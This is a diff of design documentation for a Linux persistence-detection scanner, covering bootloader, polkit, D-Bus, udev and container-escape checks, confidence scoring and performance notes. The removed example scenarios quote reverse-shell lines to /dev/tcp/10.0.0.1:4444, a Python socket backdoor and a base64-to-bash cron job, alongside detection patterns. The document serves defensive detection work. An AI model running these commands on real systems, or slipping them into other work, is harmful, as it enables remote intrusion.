+
+For each SGID file: same flow, lower baseline.
+
+### File Capabilities (`getcap`)
+
+If `getcap` is available: `timeout 30 getcap -r /usr/bin /usr/sbin /bin /sbin /usr/local/bin /usr/local/sbin`.
+
+For each capability entry:
+1. Parse capability string (e.g., `cap_setuid+ep`)
+2. `cap_sys_admin+ep` → CRITICAL (`cap_sys_admin`)
+3. `cap_setuid+ep`:
+   - Binary name in GTFOBins list → CRITICAL (`cap_setuid_gtfobin`)
+   - Binary name not in GTFOBins → HIGH (`cap_setuid_unmanaged`)
+4. `cap_net_raw+ep` on package-owned binary → LOW (`file_capability`)
+5. Other capabilities → `check_file_package()` → confidence based on package status
+
+**GTFOBins list:** `bash`, `sh`, `python`, `python2`, `python3`, `perl`, `ruby`, `find`, `vim`, `vi`, `nmap`, `awk`, `gawk`, `mawk`, `less`, `more`, `tee`, `cp`, `rsync`, `tar`
+
+### Binary Hijacking — Renamed Originals
+
+Scan dirs: `/bin`, `/usr/bin`, `/sbin`, `/usr/sbin`, `/usr/local/bin`, `/usr/local/sbin`.
+
+`find "$dir" -maxdepth 1 -type f \( -name "*.original" -o -name "*.old" -o -name "*.bak" -o -name "*.real" \)`
+
+For each renamed file:
+1. Strip suffix to derive active name (e.g., `sshd.original` → `sshd`)
+2. Check if `$dir/$active_name` exists
+3. If active exists: is it a shell script (shebang check)?
+   - Yes → `binary_hijack_wrapper` HIGH + `analyze_script_content()` → CRITICAL if malicious
+   - No (both binaries exist) → `renamed_binary_active_present` HIGH
+4. If active doesn't exist: `renamed_binary` MEDIUM (original moved, nothing replaced it yet)
+
+---
+
+## Module 10: Bootloader & Initramfs
+
+**Function:** `check_bootloader_persistence()` | **Label:** `[10/14] Bootloader`
+
+### GRUB Analysis
+
+Files: `/etc/default/grub`, `/etc/default/grub.d/*.cfg`.
+
+1. `check_file_package()` on each file
+2. Extract `GRUB_CMDLINE_LINUX_DEFAULT=` and `GRUB_CMDLINE_LINUX=` values
+3. Combine both values into one string
+4. Bash regex match for `init=([^[:space:]"']+)`
+5. Compare extracted path against standard inits: `/sbin/init`, `/lib/systemd/systemd`, `/usr/lib/systemd/systemd`, `/bin/busybox`, `/sbin/upstart`
+   - Standard match → LOW (`grub_init_standard`)
+   - Non-standard → HIGH (`grub_init_injection`)
+   - Non-standard + `analyze_script_content()` on target → CRITICAL (`grub_init_malicious_content`)
+
+### Root-level Dropped Scripts
+
+`find / -xdev -maxdepth 2 -name "*.sh" -perm /111 -type f` excluding standard system dirs.
+
+For each found script:
+1. MEDIUM (`root_dropped_script`)
+2. `analyze_script_content()` → HIGH/CRITICAL (`root_dropped_script_malicious`)
+
+### Dracut Modules
+
+For each `module-setup.sh` in `/usr/lib/dracut/modules.d/*/`:
+1. `check_file_package()` → unmanaged: HIGH (`dracut_unmanaged_module`)
+2. Grep for `inst_hook pre-pivot` → extract hook script path
+3. If pre-pivot hook found:
+   - HIGH (`dracut_pre_pivot_hook`)
+   - Read hook script content
+   - Grep for `/sysroot/etc/shadow` or `/sysroot/etc/passwd` writes → CRITICAL (`dracut_sysroot_shadow_write`)
+   - `analyze_script_content()` on hook content → CRITICAL (`dracut_hook_malicious_content`)
+
+### initramfs-tools (Ubuntu/Debian)
+
+Scan executable files in `/etc/initramfs-tools/scripts/` and `/etc/initramfs-tools/hooks/`.
+
+For each executable file:
+1. `analyze_script_content()` on content
+2. Specifically grep for writes to `$rootmnt/etc/shadow` or `$rootmnt/etc/passwd` → CRITICAL (`initramfs_rootmnt_shadow_write`)
+
+### Initrd Modification Check
+
+For each `/boot/initrd.img-*`: check mtime. Modified within 7 days → MEDIUM.
+
+---
+
+## Module 11: Polkit (PolicyKit)
+
+**Function:** `check_polkit_persistence()` | **Label:** `[11/14] Polkit`
+
+### .pkla Files (PolicyKit < 0.106)
+
+Path: `/etc/polkit-1/localauthority/50-local.d/*.pkla`
+
+For each file:
+1. `check_file_package()` — unmanaged is the normal baseline for local policy (MEDIUM)
+2. Parse KeyFile format: extract `Identity=`, `Action=`, `ResultAny=`, `ResultInactive=`, `ResultActive=`
+3. Count how many Result fields are `yes`:
+   - All three `yes` → CRITICAL (`polkit_pkla_all_result_yes`)
+   - One or two `yes` → HIGH (`polkit_pkla_partial_yes`)
+4. `Identity=` contains `unix-user:*` or `unix-group:*` (wildcard):
+   - With all-yes → CRITICAL
+   - Alone → HIGH
+
+### .rules Files (PolicyKit >= 0.106)
+
+Path: `/etc/polkit-1/rules.d/*.rules`
+
+For each file:
+1. `check_file_package()` — unmanaged is normal for local rules (MEDIUM)
+2. Grep for `return polkit.Result.YES`
+3. Check context: is the `return YES` inside an `if` block?
+   - No surrounding `if` → CRITICAL (`polkit_rules_unconditional_yes`)
+   - Inside `if` with minimal condition → HIGH
+   - Inside `if` with meaningful condition → MEDIUM (`polkit_rules_conditioned_yes`)
+4. `analyze_script_content()` on full file content for secondary patterns
+
+---
+
+## Module 12: D-Bus & NetworkManager
+
+**Function:** `check_dbus_persistence()` | **Label:** `[12/14] D-Bus`
+
+### D-Bus System Service Files
+
+Path: `/usr/share/dbus-1/system-services/*.service`
+
+For each service file:
+1. Extract `Exec=` line → first word is executable path
+2. Check if executable exists on disk:
+   - Missing → HIGH (`dbus_dangling_exec`)
+3. If exists: `check_file_package()`:
+   - UNMANAGED → HIGH (`dbus_unmanaged_exec_target`)
+4. Location check: temp dir → CRITICAL (`dbus_exec_suspicious_location`)
+5. `analyze_script_content()` on executable if it's a script → CRITICAL (`dbus_malicious_exec_content`)
+6. `check_file_package()` on the service file itself — unmanaged service file is always suspicious
+
+### D-Bus Policy Files
+
+Path: `/etc/dbus-1/system.d/*.conf`
+
+For each XML policy file:
+- Parse `<allow own="VALUE">` → flag if VALUE is `*` → HIGH (`dbus_wildcard_policy`)
+- Parse `<allow send_destination="VALUE">` → flag if VALUE is `*` → HIGH (`dbus_wildcard_policy`)
+
+### NetworkManager Dispatcher Scripts
+
+Path: `/etc/NetworkManager/dispatcher.d/`
+
+For each file:
+1. Check executable bit (`-x`) — skip non-executable
+2. `check_file_package()` → UNMANAGED: HIGH
+3. `analyze_script_content()` on content → HIGH/CRITICAL
+
+---
+
+## Module 13: Udev Rules
+
+**Function:** `check_udev_persistence()` | **Label:** `[13/14] Udev`
+
+### Paths and Initial Classification
+
+- `/run/udev/rules.d/` — ANY file here is HIGH (`udev_runtime_rule`) regardless of content
+- `/etc/udev/rules.d/` — admin-managed
+- `/lib/udev/rules.d/` — package-managed (checked via `check_file_package()`)
+
+### RUN+= Extraction and Analysis
+
+For each `.rules` file: grep for `RUN(\+?=|[[:space:]]*\+=[[:space:]]*)"[^"]+"` to extract all RUN+= directives.
+
+For each extracted command string:
+1. Grep for `at now` or `at +` or `crontab` → HIGH (`udev_run_at_delegation`)
+2. Location check: temp dirs → CRITICAL (`udev_run_suspicious_location`)
+3. `check_suspicious_patterns()` on command string → CRITICAL (`udev_run_malicious_command`)
+4. If command is a file path: read file content, `analyze_script_content()` → CRITICAL (`udev_run_target_malicious`)
+
+---
+
+## Module 14: Container Escape Persistence
+
+**Function:** `check_container_persistence()` | **Label:** `[14/14] Container`
+
+Gracefully skips entire module if `docker` is not installed or not in PATH.
+
+### Dockerfile Scan
+
+`find /tmp /root /home /var/tmp -maxdepth 3 -name "Dockerfile" -type f`
+
+For each found Dockerfile:
+1. HIGH (`dockerfile_suspicious_location`)
+2. Grep content for: `nsenter`, `socat exec:`, `--privileged` → CRITICAL (`dockerfile_escape_technique`)
+
+### Docker Daemon Config
+
+If `/etc/docker/daemon.json` exists:
+1. Parse JSON (via grep on key-value patterns)
+2. `userns-remap` is empty/null → HIGH (`docker_daemon_weakened_security`)
+3. `no-new-privileges` is false → HIGH
+
+### Container Inspection
+
+`docker ps -aq` → list of all container IDs.
+Result cap: first 50 containers.
+
+For each container ID: `docker inspect "$id"` (with `timeout 10`).
+
+Parse JSON output:
+- `HostConfig.Privileged: true` → HIGH (`container_privileged`)
+- `HostConfig.Privileged: true` AND `HostConfig.PidMode: host` → CRITICAL (`container_privileged_pid_host`)
+- Any mount path containing `/var/run/docker.sock` → CRITICAL (`container_docker_sock_mount`)
+- `Config.Entrypoint` or `Config.Cmd` contains `nsenter` → CRITICAL (`container_nsenter_entrypoint`)
+
+---
+
+## Confidence Scoring Reference
+
+| Level | Trigger Examples |
+|---|---|
+| **LOW** | Package-verified file, standard location, no patterns |
+| **MEDIUM** | Unmanaged file, no patterns; or broken/missing reference; or file modified 7-30 days ago |
+| **HIGH** | Unmanaged file with location risk; NEVER_WHITELIST match in monitored content; single strong structural indicator (SUID unmanaged, system account SSH key) |
+| **CRITICAL** | Package integrity failure; execution from temp dirs with SUID; PAM module unmanaged/modified; initrd/dracut shadow write; container escape primitives |
+
+**Time escalation:** File modified within 7 days advances confidence one tier (LOW→MEDIUM, MEDIUM→HIGH). Applied after package-based adjustment.
+
+**SUID/SGID escalation:** Any HIGH finding on a file with SUID or SGID bit → CRITICAL. Pattern string appended with `+suid_sgid`.
+
+---
+
+## Output Format
+
+Each finding written as one line to both CSV and JSONL. Fields:
+
 ```
-SCAN: APT/YUM configs, git configs (~/.gitconfig for all users), web directories
-GIT: credential.helper and suspicious patterns analyzed for all users including non-root
-WEBSHELLS: find *.php/*.asp/*.jsp in web dirs; 100-file limit enforced;
-           webshell patterns (eval, base64_decode, system(), passthru()) → HIGH
-CONFIDENCE: Recently modified + webshell patterns → HIGH
+timestamp       ISO 8601 UTC
+hostname        system hostname
+category        module category (e.g., "Systemd Service", "Cron Job")
+confidence      LOW | MEDIUM | HIGH | CRITICAL
+file_path       path of the artifact (service file, script, key, etc.)
+file_hash       SHA-256 of file_path (or "N/A" for non-file artifacts)
+file_owner      user:group
+file_permissions octal permissions
+file_age_days   days since last modification
+package_status  package manager status string from is_package_managed()
+command         the executable or command involved
+description     human-readable description
+matched_pattern pattern ID (see MATCHED_PATTERNS.md)
+matched_string  the specific content that triggered the finding
 ```
 
 ---
 
-## Output Schema
-
-### CSV Columns (v2.2.0)
-```
-timestamp,hostname,category,confidence,file_path,file_hash,
-file_owner,file_permissions,file_age_days,package_status,
-command,enabled_status,description,matched_pattern,matched_string
-```
-
-### JSONL Fields
-```json
-{
-  "timestamp": "2026-02-24T10:30:00Z",
-  "hostname": "server01",
-  "category": "Systemd Service",
-  "confidence": "HIGH",
-  "file_path": "/etc/systemd/system/backdoor.service",
-  "file_hash": "abc123...",
-  "file_owner": "root:root",
-  "file_permissions": "644",
-  "file_age_days": "3",
-  "package_status": "unmanaged",
-  "command": "/usr/bin/python3 -c 'import socket...'",
-  "enabled_status": "enabled",
-  "description": "backdoor.service",
-  "matched_pattern": "python.*socket\\.socket",
-  "matched_string": "python3 -c 'import socket"
-}
-```
-
----
-
-## Example Detection Scenarios
-
-### Scenario 1: Reverse Shell Service
-```
-Input:  /etc/systemd/system/update.service
-        ExecStart=/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
-
-Detection Path:
-  1. Extract ExecStart
-  2. quick_suspicious_check() → HIT on "bash -i" and "/dev/tcp/"
-  3. NEVER_WHITELIST match → CRITICAL
-     matched_pattern: "/dev/tcp/"
-     matched_string: "/bin/bash -i >& /dev/tcp/10.0.0.1/4444"
-```
-
-### Scenario 2: Python Backdoor Script
-```
-Input:  /etc/systemd/system/monitor.service
-        ExecStart=/usr/bin/python3 /opt/monitor.py
-
-        /opt/monitor.py contains:
-        import socket
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("10.0.0.1", 4444))
-
-Detection Path:
-  1. Extract ExecStart
-  2. is_package_managed(/opt/monitor.py) → unmanaged
-  3. analyze_script_content(/opt/monitor.py)
-     → Comment stripping applied
-     → NEVER_WHITELIST: socket\.socket → MATCH
-  4. Result: HIGH confidence
-     matched_pattern: "python.*socket\.socket"
-     matched_string: "s = socket.socket("
-```
-
-### Scenario 3: Legitimate Package-Managed Service
-```
-Input:  /lib/systemd/system/ssh.service
-        ExecStart=/usr/sbin/sshd -D
-
-Detection Path:
-  1. Extract ExecStart
-  2. quick_suspicious_check() → MISS → skip analysis
-  3. is_package_managed(/usr/sbin/sshd)
-     → dpkg -S → openssh-server
-     → dpkg --verify → PASS (unmodified)
-  4. Result: LOW confidence (filtered in default mode)
-```
-
-### Scenario 4: Modified System Binary (Rootkit)
-```
-Input:  /lib/systemd/system/cron.service
-        ExecStart=/usr/sbin/cron -f
-
-        /usr/sbin/cron has been replaced (rootkit)
-
-Detection Path:
-  1. Extract ExecStart
-  2. is_package_managed(/usr/sbin/cron)
-     → dpkg -S → cron
-     → dpkg --verify cron → MODIFIED
-  3. adjust_confidence_for_package() → CRITICAL
-     package_status: "dpkg:cron:MODIFIED"
-```
-
-### Scenario 5: Base64 Obfuscated Cron Job
-```
-Input:  /etc/cron.d/backup
-        * * * * * root echo 'YmFzaCAtaQ==' | base64 -d | bash
-
-Detection Path:
-  1. Read cron content, apply comment stripping
-  2. NEVER_WHITELIST: "\| *bash" → MATCH
-  3. SUSPICIOUS_COMMANDS: "echo.*\|.*base64.*-d" → MATCH
-  4. Result: HIGH confidence
-     matched_pattern: "\| *bash"
-     matched_string: "| bash"
-```
-
-### Scenario 6: Safe Python Import (No False Positive)
-```
-Input:  /etc/cron.d/metrics
-        * * * * * root python3 -c 'import sys; print(sys.version)'
-
-Detection Path:
-  1. quick_suspicious_check() → checks UNIFIED pattern
-  2. "python.*-c.*import" would match — but pattern is:
-     "python.*-c.*import.*(socket|subprocess|pty|ctypes|...)"
-     → "import sys" does NOT match the dangerous-module sub-pattern
-  3. No other patterns match
-  4. Result: LOW / MISS → no finding
-```
-
-### Scenario 7: SUID Binary with Suspicious Match
-```
-Input:  /usr/local/bin/update-helper
-        permissions: rwsr-xr-x (SUID set)
-        Content matches: "curl.*\|.*bash"
-
-Detection Path:
-  1. analyze_script_content() → MATCH → HIGH
-  2. add_finding_new() detects file_permissions =~ [sS]
-     → confidence HIGH → CRITICAL escalation
-  3. Result: CRITICAL confidence
-     matched_pattern: "curl.*|.*bash+suid_sgid"
-```
-
-### Scenario 8: Recently Modified Shell Profile
-```
-Input:  /home/user/.bashrc
-        Modified 2 days ago
-        Contains: PATH modification (MEDIUM confidence)
-
-Detection Path:
-  1. check_shell_profiles() → user profile loop
-  2. analyze content → confidence=MEDIUM
-  3. Time check: days_old=2 < 7 AND confidence==MEDIUM
-     → confidence = HIGH
-  4. Result: HIGH confidence
-     matched_pattern: "recent_modification"
-     matched_string: "2 days old"
-```
-
----
-
-## Performance Optimizations
-
-### SCAN_EPOCH Hoisting
-```
-BEFORE: stat --format="%Y" "$file" called per-file at scan time
-AFTER:  SCAN_EPOCH=$(date +%s) captured once at startup
-        Per-file: age_days=$(( (SCAN_EPOCH - file_mtime) / 86400 ))
-```
-
-### Package Manager Cache
-```
-First lookup:  dpkg -S /usr/bin/python3 → python3
-               Cache: PKG_CACHE["/usr/bin/python3"]="dpkg:python3"
-
-Subsequent:    Cache hit → Skip dpkg call
-               Return cached result immediately
-
-Separate PKG_VERIFY_CACHE caches dpkg --verify results
-(ownership lookup and integrity check cached independently)
-```
-
-### systemctl Cache
-```
-At startup: init_systemctl_cache() runs:
-  systemctl list-units --all --no-pager → SYSTEMCTL_CACHE associative array
-  Per-service enabled check: O(1) cache lookup instead of systemctl subprocess
-```
-
-### calculate_entropy — Single awk Pass
-```
-BEFORE: External program + bash arithmetic (multiple subprocesses)
-AFTER:  awk one-liner computes Shannon entropy in a single pass
-        No external dependencies
-```
-
-### Combined Pattern Matching
-```
-Instead of:
-  for pattern in patterns; do
-    grep -qE "$pattern"   # N subprocess calls
-  done
-
-Now:
-  combined="(pattern1|pattern2|...)"
-  grep -qE "$combined"    # 1 subprocess call
-  if match:
-    # Only then loop to find specific pattern
-```
-
-### Tail Scan for Large Scripts
-```
-Files > 1000 lines: read head-1000 + tail-200
-Files > 1200 lines: also read mid-200 (N/2 ± 100)
-Avoids reading entire multi-MB scripts into memory
-```
-
----
-
-## Future Performance Improvements
-
-These are potential optimizations not yet implemented. Each item includes context
-on where the overhead comes from and an estimate of the improvement.
-
-### 1. Replace `echo "$var" | cmd` with `cmd <<< "$var"` (High Impact)
-
-**Where:** ~50 instances across `analyze_script_content()`, `is_package_managed()`,
-`get_executable_from_command()`, and the cron/systemd analysis loops.
-See lines: 677, 692, 735, 759, 802, 849, 1122, 1128, 1131, 1141, 1144, 1164,
-1167, 1181, 1184, 1190, 1193, 1201.
-
-**Why it matters:** `echo "$var" | grep "..."` creates **two** subprocesses — one
-fork for `echo` and one for `grep`, connected by a pipe. A bash here-string
-(`grep "..." <<< "$var"`) expands the string within the current shell and spawns
-only the `grep` subprocess.
-
-**Cost per instance:** ~1–3 ms on a modern Linux system (process fork + exec).
-
-**Estimated total impact:**
-```
-Typical scan: ~200 services + ~50 cron jobs + ~30 shell profiles
-  → analyze_script_content() called ~50 times for unmanaged files
-  → ~10 echo-pipe calls per analyze_script_content() invocation
-  → 50 × 10 = 500 extra subprocesses
-  → At ~2ms each: ~1 second saved
-Additional savings from is_package_managed() calls: ~0.5s
-Total estimated saving: 1–2 seconds on a typical system scan
-```
-
-**Fix:**
-```bash
-# Before (2 subprocesses):
-full_line=$(echo "$script_content_clean" | grep -iE "$PATTERN" | head -1)
-
-# After (1 subprocess):
-full_line=$(grep -iE "$PATTERN" <<< "$script_content_clean" | head -1)
-```
-
----
-
-### 2. Bash String Operations Instead of `sed` / `awk` / `cut` (Medium Impact)
-
-**Where (sed trimming):** Lines 1131, 1144, 1184, 1193 — `echo "$line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//'`
-**Where (awk first-word):** Line 802 — `echo "$command" | awk '{print $1}'`
-**Where (cut field):** Lines 677 — `echo "$dpkg_output" | cut -d':' -f1`
-**Where (tr normalize):** Line 849 — `echo "$command" | tr -s '[:space:]' ' '`
-
-**Why it matters:** These are all string manipulation operations on small in-memory
-variables. Each one forks a subprocess and passes data through a pipe, only to
-return a slightly modified string. Bash can perform all of these operations natively
-with zero subprocess overhead.
-
-**Estimated total impact:**
-```
-sed trim:   called ~4 times per suspicious file × 50 files = 200 calls × 2ms = 0.4s
-awk $1:     called once per service/cron entry × ~500 entries = 500 calls × 2ms = 1s
-cut:        called in is_package_managed() × ~500 unique files = ~500 calls × 1ms = 0.5s
-tr:         called once per interpreter command = minor
-Total estimated saving: 1.5–2 seconds
-```
-
-**Fixes:**
-```bash
-# sed trim → bash parameter expansion (0 subprocesses):
-str="${str#"${str%%[! ]*}"}"   # ltrim
-str="${str%"${str##*[! ]}"}"   # rtrim
-str="${str:0:200}"             # truncate
-
-# awk '{print $1}' → bash native (0 subprocesses):
-executable="${command%% *}"
-# or: read -r executable _ <<< "$command"
-
-# cut -d':' -f1 → bash native (0 subprocesses):
-package="${dpkg_output%%:*}"
-
-# tr -s ' ' → read handles it natively (0 subprocesses):
-read -ra args <<< "$command"  # IFS already collapses spaces
-```
-
----
-
-### 3. `date -u` Called per Finding (Medium Impact)
-
-**Where:** Line 1527 inside `add_finding_new()`, called for every finding written
-to output.
-
-**Why it matters:** On a system with many unmanaged files, `add_finding_new()` can
-be called 50–300 times per scan. Each call forks a `date` subprocess. The timestamp
-only needs second-level precision and a scan completes in seconds, so all findings
-can share a timestamp without meaningful inaccuracy.
-
-**Estimated total impact:**
-```
-200 findings × 1 date subprocess × ~2ms = 0.4 seconds saved
-```
-
-**Fix:**
-```bash
-# In main(), after build_combined_patterns():
-SCAN_TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
-
-# In add_finding_new() — replace line 1527:
-# local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")  ← remove
-local timestamp="$SCAN_TIMESTAMP"                    ← use pre-computed value
-```
-
----
-
-### 4. Hoist `command -v dpkg/rpm/pacman` to Startup Booleans (Medium Impact)
-
-**Where:** Lines 640, 710, 753 inside `is_package_managed()`.
-
-**Why it matters:** `is_package_managed()` is the most-called function in the entire
-script. Even with PKG_CACHE catching file-level repeats, the `command -v dpkg` check
-runs on every cache miss. On a scan of 1000 unique file paths, that's 3000 `command -v`
-calls — one set per file before the dpkg/rpm/pacman lookup.
-
-`command -v` is a bash built-in, so it's cheaper than external commands, but it still
-involves a PATH hash lookup on each call.
-
-**Estimated total impact:**
-```
-1000 unique paths × 3 command -v checks (dpkg, rpm, pacman) = 3000 built-in calls
-Savings: minor per call but cumulative; estimated 0.1–0.2 seconds
-More importantly: eliminates the conditional branching overhead at scale
-```
-
-**Fix:**
-```bash
-# In main(), after build_combined_patterns():
-HAS_DPKG=false;   command -v dpkg   &>/dev/null && HAS_DPKG=true
-HAS_RPM=false;    command -v rpm    &>/dev/null && HAS_RPM=true
-HAS_PACMAN=false; command -v pacman &>/dev/null && HAS_PACMAN=true
-
-# In is_package_managed() — replace conditional:
-if $HAS_DPKG; then   # was: if command -v dpkg &>/dev/null
-```
-
----
-
-### 5. Parse `/etc/passwd` Once, Cache User Home Directories (Low-Medium Impact)
-
-**Where:** Lines 1635, 2474, 2823, 3809 — four separate modules each independently
-iterate through `/etc/passwd` to enumerate user home directories.
-
-**Why it matters:** Each iteration reads `/etc/passwd` in full and loops over all
-users. On a system with hundreds of accounts this is minor, but the file is read
-4 times unnecessarily. More importantly, it's a maintenance issue — any per-user
-scan logic must be duplicated in each loop.
-
-**Estimated total impact:**
-```
-4 × (read /etc/passwd + iterate N users) → 1 × same
-For 100 users: saves 3 file reads and 300 loop iterations
-Estimated saving: < 0.1 seconds, but cleans up the code significantly
-```
-
-**Fix:**
-```bash
-# In main(), after init_output:
-declare -A USER_HOMES   # USER_HOMES["username"]="/home/username"
-declare -a USER_LIST    # ordered for consistent output
-while IFS=: read -r _user _ _uid _ _ _home _; do
-    if [[ $_uid -ge 1000 ]] || [[ $_uid -eq 0 ]]; then
-        USER_HOMES["$_user"]="$_home"
-        USER_LIST+=("$_user")
-    fi
-done < /etc/passwd
-
-# Each module then iterates: for user in "${USER_LIST[@]}"; do home="${USER_HOMES[$user]}"
-```
-
----
-
-### 6. Shell Profile Files Read Twice (Low-Medium Impact)
-
-**Where:** `check_shell_profiles()` reads file content into `$content` via
-`head -n 500` (e.g., line 2686), passes it to `quick_suspicious_check`. If that
-misses, `analyze_script_content()` is called — which re-reads the same file from
-disk via its own `head -n 1000` (line 1092).
-
-**Why it matters:** Two disk reads per profile file. For a system with 10 users
-each having 6 profile files = 120 potential double-reads. On warm-cache systems
-(Linux page cache) this is negligible, but on cold-cache first scans it adds up.
-
-**Estimated total impact:**
-```
-60 profile files × 1 extra disk read × ~0.5ms (page cache hit) = 0.03s
-On cold cache (NFS mounts, encrypted home dirs): could be 5–50ms per file
-Total: 0.03s warm / up to 3s cold cache
-```
-
-**Fix:** Either (a) call only `analyze_script_content()` directly (it reads more
-thoroughly anyway), or (b) add an optional `content` parameter to
-`analyze_script_content()` so already-read content can be passed in.
-
----
-
-### 7. Module Parallelization (High Impact, High Complexity)
-
-**Where:** `main()` calls the 7 detection modules sequentially (check_systemd,
-check_cron, check_shell_profiles, check_init_scripts, check_kernel_and_preload,
-check_additional_persistence, check_common_backdoors).
-
-**Why it matters:** Each module is independent — they scan different paths, don't
-modify each other's state, and all write to the same output files via append.
-On a typical scan, systemd takes ~40%, cron ~25%, shell profiles ~20%, rest ~15%.
-Running the top 3 in parallel would nearly halve wall-clock time.
-
-**Estimated total impact:**
-```
-Sequential:  40s total scan (example)
-Parallel (3 workers): ~16s (limited by slowest module)
-Estimated saving: 50–60% of wall-clock time
-```
-
-**Trade-off:** Bash associative arrays (PKG_CACHE, FILE_METADATA_CACHE,
-SYSTEMCTL_CACHE, FILE_HASH_CACHE) are not shared across subshells. Each worker
-would start with empty caches, eliminating the cross-module cache benefit. This
-means more dpkg/stat calls overall, partially offsetting the parallelism gain.
-
-**Mitigation approach:**
-```bash
-# Option A: Pre-populate caches from a quick file enumeration before parallelizing
-# Option B: Use temp files per module, merge at end (loses caches but gains parallelism)
-# Option C: Accept cache loss for the first scan; run sequentially in --baseline mode
-```
-
----
-
-### Summary: Expected Total Improvement
-
-| Optimization | Estimated Saving | Complexity |
-|---|---|---|
-| 1. echo-pipe → here-string | 1–2s | Low |
-| 2. bash string ops (sed/awk/cut) | 1.5–2s | Low |
-| 3. date per-finding | 0.4s | Low |
-| 4. command -v hoisting | 0.1–0.2s | Low |
-| 5. /etc/passwd single parse | <0.1s | Low |
-| 6. Shell profile single read | 0.03–3s | Low |
-| 7. Module parallelization | 50–60% wall time | High |
-
-**Items 1–6 combined (no parallelization):** ~3–8 seconds saved on a typical 30–60s
-scan (5–20% improvement, pure subprocess elimination, zero behavioral change).
-
-**Item 7 (parallelization):** The largest single gain but requires careful handling
-of the cache-sharing trade-off. Best implemented after items 1–6 are applied so
-each worker is already optimized.
-
----
-
-## Filter Modes
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                      FILTER MODE LOGIC                          │
-└─────────────────────────────────────────────────────────────────┘
-
-Default: FILTER_MODE=suspicious_only
-  → Show: MEDIUM, HIGH, CRITICAL
-  → Hide: LOW
-
---all flag: FILTER_MODE=all
-  → Show: LOW, MEDIUM, HIGH, CRITICAL
-
-MIN_CONFIDENCE=HIGH:
-  → Show: HIGH, CRITICAL only
-  → Hide: LOW, MEDIUM
-
-Combination: MIN_CONFIDENCE=HIGH --all
-  → Show: HIGH, CRITICAL
-  → (--all has no effect when MIN_CONFIDENCE is set)
-```
-
----
-
-## Quick Reference: What Triggers Each Confidence Level
-
-| Confidence | Triggers |
-|------------|----------|
-| **CRITICAL** | Modified package files (dpkg/rpm verify failed); SUID/SGID bit + suspicious pattern match |
-| **HIGH** | NEVER_WHITELIST pattern match; reverse shell indicators; download+execute; obfuscation with execution context; suspicious script content; inline -c/-e code; recent modification (<7d) of MEDIUM-confidence file; suspicious locations |
-| **MEDIUM** | Unmanaged files with ambiguous content; unusual but non-definitive configurations |
-| **LOW** | Package-managed and integrity-verified files; known-good paths; runtime-managed packages (npm/pip/cargo/go/gems) |
+*Last Updated: 2026-03-16 | Version: 2.4.0*
